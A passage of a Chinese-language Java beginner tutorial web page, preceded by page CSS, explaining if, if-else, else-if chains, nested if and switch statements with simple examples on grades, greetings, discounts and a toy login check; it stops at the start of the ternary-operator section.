input[type=checkbox]:checked:before{background:url("data:image/png;base64,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");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-light">.hljs-comment,.hljs-quote{color:#696969}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#d91e18}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#aa5d00}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:green}.hljs-section,.hljs-title{color:#007faa}.hljs-keyword,.hljs-selector-tag{color:#7928a1}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fefefe;color:#545454}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>这些"如果...就..."的逻辑，在Java中就是<strong>条件判断</strong>语句</p>
<h2 data-id="heading-0">1.if语句：最简单的判断</h2>
<h3 data-id="heading-1">1.1 基本if语句</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BasicIf</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== 基本if语句 ==="</span>);
        
        <span class="hljs-comment">// 示例1：判断是否成年</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
        
        <span class="hljs-keyword">if</span> (age &gt;= <span class="hljs-number">18</span>) {
            System.out.println(<span class="hljs-string">"你已经成年了！"</span>);
        }
        
        <span class="hljs-comment">// 示例2：判断成绩是否及格</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">score</span> <span class="hljs-operator">=</span> <span class="hljs-number">85</span>;
        
        <span class="hljs-keyword">if</span> (score &gt;= <span class="hljs-number">60</span>) {
            System.out.println(<span class="hljs-string">"恭喜！成绩及格！"</span>);
            System.out.println(<span class="hljs-string">"你的分数是："</span> + score);
        }
        
        System.out.println(<span class="hljs-string">"判断结束，继续执行其他代码..."</span>);
    }
}
</code></pre>
<h3 data-id="heading-2">1.2 if-else语句：二选一</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IfElseDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== if-else语句 ==="</span>);
        
        <span class="hljs-comment">// 示例1：判断数字是奇数还是偶数</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">number</span> <span class="hljs-operator">=</span> <span class="hljs-number">7</span>;
        
        <span class="hljs-keyword">if</span> (number % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>) {
            System.out.println(number + <span class="hljs-string">" 是偶数"</span>);
        } <span class="hljs-keyword">else</span> {
            System.out.println(number + <span class="hljs-string">" 是奇数"</span>);
        }
        
        <span class="hljs-comment">// 示例2：判断是否可以通过考试</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">score</span> <span class="hljs-operator">=</span> <span class="hljs-number">55</span>;
        
        <span class="hljs-keyword">if</span> (score &gt;= <span class="hljs-number">60</span>) {
            System.out.println(<span class="hljs-string">"考试通过！"</span>);
        } <span class="hljs-keyword">else</span> {
            System.out.println(<span class="hljs-string">"考试不及格，需要补考"</span>);
        }
        
        <span class="hljs-comment">// 示例3：简单的登录验证</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-string">"admin"</span>;
        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">"123456"</span>;
        
        <span class="hljs-keyword">if</span> (username.equals(<span class="hljs-string">"admin"</span>) &amp;&amp; password.equals(<span class="hljs-string">"123456"</span>)) {
            System.out.println(<span class="hljs-string">"登录成功！"</span>);
        } <span class="hljs-keyword">else</span> {
            System.out.println(<span class="hljs-string">"用户名或密码错误！"</span>);
        }
    }
}
</code></pre>
<h2 data-id="heading-3">2.多重判断：if-else if-else</h2>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultipleIfElse</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== 多重条件判断 ==="</span>);
        
        <span class="hljs-comment">// 示例1：成绩等级评定</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">score</span> <span class="hljs-operator">=</span> <span class="hljs-number">85</span>;
        
        <span class="hljs-keyword">if</span> (score &gt;= <span class="hljs-number">90</span>) {
            System.out.println(<span class="hljs-string">"优秀！成绩等级：A"</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (score &gt;= <span class="hljs-number">80</span>) {
            System.out.println(<span class="hljs-string">"良好！成绩等级：B"</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (score &gt;= <span class="hljs-number">70</span>) {
            System.out.println(<span class="hljs-string">"中等！成绩等级：C"</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (score &gt;= <span class="hljs-number">60</span>) {
            System.out.println(<span class="hljs-string">"及格！成绩等级：D"</span>);
        } <span class="hljs-keyword">else</span> {
            System.out.println(<span class="hljs-string">"不及格！成绩等级：F"</span>);
        }
        
        <span class="hljs-comment">// 示例2：根据时间打招呼</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">hour</span> <span class="hljs-operator">=</span> <span class="hljs-number">14</span>; <span class="hljs-comment">// 24小时制</span>
        
        <span class="hljs-keyword">if</span> (hour &gt;= <span class="hljs-number">5</span> &amp;&amp; hour &lt; <span class="hljs-number">12</span>) {
            System.out.println(<span class="hljs-string">"上午好！"</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (hour &gt;= <span class="hljs-number">12</span> &amp;&amp; hour &lt; <span class="hljs-number">18</span>) {
            System.out.println(<span class="hljs-string">"下午好！"</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (hour &gt;= <span class="hljs-number">18</span> &amp;&amp; hour &lt; <span class="hljs-number">22</span>) {
            System.out.println(<span class="hljs-string">"晚上好！"</span>);
        } <span class="hljs-keyword">else</span> {
            System.out.println(<span class="hljs-string">"夜深了，早点休息！"</span>);
        }
        
        <span class="hljs-comment">// 示例3：计算折扣</span>
        <span class="hljs-type">double</span> <span class="hljs-variable">purchaseAmount</span> <span class="hljs-operator">=</span> <span class="hljs-number">1200.0</span>;
        <span class="hljs-type">double</span> <span class="hljs-variable">discount</span> <span class="hljs-operator">=</span> <span class="hljs-number">0.0</span>;
        
        <span class="hljs-keyword">if</span> (purchaseAmount &gt;= <span class="hljs-number">1000</span>) {
            discount = <span class="hljs-number">0.2</span>; <span class="hljs-comment">// 8折</span>
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (purchaseAmount &gt;= <span class="hljs-number">500</span>) {
            discount = <span class="hljs-number">0.1</span>; <span class="hljs-comment">// 9折</span>
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (purchaseAmount &gt;= <span class="hljs-number">200</span>) {
            discount = <span class="hljs-number">0.05</span>; <span class="hljs-comment">// 95折</span>
        }
        <span class="hljs-comment">// 小于200没有折扣</span>
        
        <span class="hljs-type">double</span> <span class="hljs-variable">finalAmount</span> <span class="hljs-operator">=</span> purchaseAmount * (<span class="hljs-number">1</span> - discount);
        System.out.println(<span class="hljs-string">"原价："</span> + purchaseAmount + <span class="hljs-string">"元"</span>);
        System.out.println(<span class="hljs-string">"折扣："</span> + (discount * <span class="hljs-number">100</span>) + <span class="hljs-string">"%"</span>);
        System.out.println(<span class="hljs-string">"最终价格："</span> + finalAmount + <span class="hljs-string">"元"</span>);
    }
}
</code></pre>
<h2 data-id="heading-4">3.嵌套if语句：判断中的判断</h2>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NestedIf</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== 嵌套if语句 ==="</span>);
        
        <span class="hljs-comment">// 示例1：复杂的登录验证</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> <span class="hljs-string">"admin"</span>;
        <span class="hljs-type">String</span> <span class="hljs-variable">password</span> <span class="hljs-operator">=</span> <span class="hljs-string">"123456"</span>;
        <span class="hljs-type">boolean</span> <span class="hljs-variable">isVerified</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 是否已验证邮箱</span>
        
        <span class="hljs-keyword">if</span> (username.equals(<span class="hljs-string">"admin"</span>)) {
            <span class="hljs-keyword">if</span> (password.equals(<span class="hljs-string">"123456"</span>)) {
                <span class="hljs-keyword">if</span> (isVerified) {
                    System.out.println(<span class="hljs-string">"登录成功！欢迎回来！"</span>);
                } <span class="hljs-keyword">else</span> {
                    System.out.println(<span class="hljs-string">"请先验证邮箱！"</span>);
                }
            } <span class="hljs-keyword">else</span> {
                System.out.println(<span class="hljs-string">"密码错误！"</span>);
            }
        } <span class="hljs-keyword">else</span> {
            System.out.println(<span class="hljs-string">"用户名不存在！"</span>);
        }
        
        <span class="hljs-comment">// 示例2：学生奖学金评定</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">isFullTime</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 是否全日制</span>
        <span class="hljs-type">double</span> <span class="hljs-variable">gpa</span> <span class="hljs-operator">=</span> <span class="hljs-number">3.8</span>; <span class="hljs-comment">// 平均绩点</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">attendance</span> <span class="hljs-operator">=</span> <span class="hljs-number">95</span>; <span class="hljs-comment">// 出勤率</span>
        
        <span class="hljs-keyword">if</span> (isFullTime) {
            <span class="hljs-keyword">if</span> (gpa &gt;= <span class="hljs-number">3.5</span>) {
                <span class="hljs-keyword">if</span> (attendance &gt;= <span class="hljs-number">90</span>) {
                    System.out.println(<span class="hljs-string">"符合一等奖学金条件！"</span>);
                } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (attendance &gt;= <span class="hljs-number">80</span>) {
                    System.out.println(<span class="hljs-string">"符合二等奖学金条件！"</span>);
                } <span class="hljs-keyword">else</span> {
                    System.out.println(<span class="hljs-string">"出勤率不足，不符合奖学金条件"</span>);
                }
            } <span class="hljs-keyword">else</span> {
                System.out.println(<span class="hljs-string">"绩点不足，不符合奖学金条件"</span>);
            }
        } <span class="hljs-keyword">else</span> {
            System.out.println(<span class="hljs-string">"非全日制学生不符合奖学金条件"</span>);
        }
        
        <span class="hljs-comment">// 示例3：游戏角色状态判断</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">health</span> <span class="hljs-operator">=</span> <span class="hljs-number">80</span>; <span class="hljs-comment">// 生命值</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">mana</span> <span class="hljs-operator">=</span> <span class="hljs-number">30</span>;   <span class="hljs-comment">// 魔法值</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">hasWeapon</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
        
        <span class="hljs-keyword">if</span> (health &gt; <span class="hljs-number">0</span>) { <span class="hljs-comment">// 角色还活着</span>
            <span class="hljs-keyword">if</span> (hasWeapon) {
                <span class="hljs-keyword">if</span> (mana &gt;= <span class="hljs-number">20</span>) {
                    System.out.println(<span class="hljs-string">"可以使用魔法攻击！"</span>);
                } <span class="hljs-keyword">else</span> {
                    System.out.println(<span class="hljs-string">"魔法值不足，只能普通攻击"</span>);
                }
            } <span class="hljs-keyword">else</span> {
                System.out.println(<span class="hljs-string">"没有武器，只能徒手攻击"</span>);
            }
        } <span class="hljs-keyword">else</span> {
            System.out.println(<span class="hljs-string">"角色已死亡！"</span>);
        }
    }
}
</code></pre>
<h2 data-id="heading-5">4.switch语句：多分支选择</h2>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SwitchDemo</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== switch语句 ==="</span>);
        
        <span class="hljs-comment">// 示例1：根据星期几决定做什么</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">dayOfWeek</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>; <span class="hljs-comment">// 1=周一，2=周二，...，7=周日</span>
        
        <span class="hljs-keyword">switch</span> (dayOfWeek) {
            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
                System.out.println(<span class="hljs-string">"星期一：新的一周开始了！"</span>);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
                System.out.println(<span class="hljs-string">"星期二：继续努力工作！"</span>);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
                System.out.println(<span class="hljs-string">"星期三：一周过半啦！"</span>);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:
                System.out.println(<span class="hljs-string">"星期四：周末快来了！"</span>);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:
                System.out.println(<span class="hljs-string">"星期五：终于到周五了！"</span>);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:
            <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:
                System.out.println(<span class="hljs-string">"周末：好好休息！"</span>);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">default</span>:
                System.out.println(<span class="hljs-string">"无效的星期数！"</span>);
        }
        
        <span class="hljs-comment">// 示例2：根据成绩等级给出评语</span>
        <span class="hljs-type">char</span> <span class="hljs-variable">grade</span> <span class="hljs-operator">=</span> <span class="hljs-string">'B'</span>;
        
        <span class="hljs-keyword">switch</span> (grade) {
            <span class="hljs-keyword">case</span> <span class="hljs-string">'A'</span>:
                System.out.println(<span class="hljs-string">"优秀！继续保持！"</span>);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-string">'B'</span>:
                System.out.println(<span class="hljs-string">"良好！还有进步空间！"</span>);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-string">'C'</span>:
                System.out.println(<span class="hljs-string">"中等！需要更加努力！"</span>);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-string">'D'</span>:
                System.out.println(<span class="hljs-string">"及格！要加油了！"</span>);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-string">'F'</span>:
                System.out.println(<span class="hljs-string">"不及格！需要补考！"</span>);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">default</span>:
                System.out.println(<span class="hljs-string">"无效的成绩等级！"</span>);
        }
        
        <span class="hljs-comment">// 示例3：根据月份判断季节</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">month</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;
        String season;
        
        <span class="hljs-keyword">switch</span> (month) {
            <span class="hljs-keyword">case</span> <span class="hljs-number">12</span>:
            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
            <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
                season = <span class="hljs-string">"冬季"</span>;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
            <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:
            <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:
                season = <span class="hljs-string">"春季"</span>;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:
            <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:
            <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:
                season = <span class="hljs-string">"夏季"</span>;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">9</span>:
            <span class="hljs-keyword">case</span> <span class="hljs-number">10</span>:
            <span class="hljs-keyword">case</span> <span class="hljs-number">11</span>:
                season = <span class="hljs-string">"秋季"</span>;
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">default</span>:
                season = <span class="hljs-string">"无效月份"</span>;
        }
        
        System.out.println(month + <span class="hljs-string">"月是"</span> + season);
        
        <span class="hljs-comment">// 示例4：Java 12+ 新的switch表达式</span>
        System.out.println(<span class="hljs-string">"\n=== Java 12+ switch表达式 ==="</span>);
        <span class="hljs-type">String</span> <span class="hljs-variable">fruit</span> <span class="hljs-operator">=</span> <span class="hljs-string">"苹果"</span>;
        
        <span class="hljs-type">String</span> <span class="hljs-variable">taste</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">switch</span> (fruit) {
            <span class="hljs-keyword">case</span> <span class="hljs-string">"苹果"</span> -&gt; <span class="hljs-string">"甜的"</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-string">"柠檬"</span> -&gt; <span class="hljs-string">"酸的"</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-string">"香蕉"</span> -&gt; <span class="hljs-string">"软的"</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-string">"西瓜"</span> -&gt; <span class="hljs-string">"多汁的"</span>;
            <span class="hljs-keyword">default</span> -&gt; <span class="hljs-string">"不知道的味道"</span>;
        };
        
        System.out.println(fruit + <span class="hljs-string">"是"</span> + taste);
    }
}
</code></pre>
<h2 data-id="heading-6">5.三元运算符：简洁的条件判断</h2>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TernaryOperator</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        System.out.println(<span class="hljs-string">"=== 三元运算符 ==="</span>);
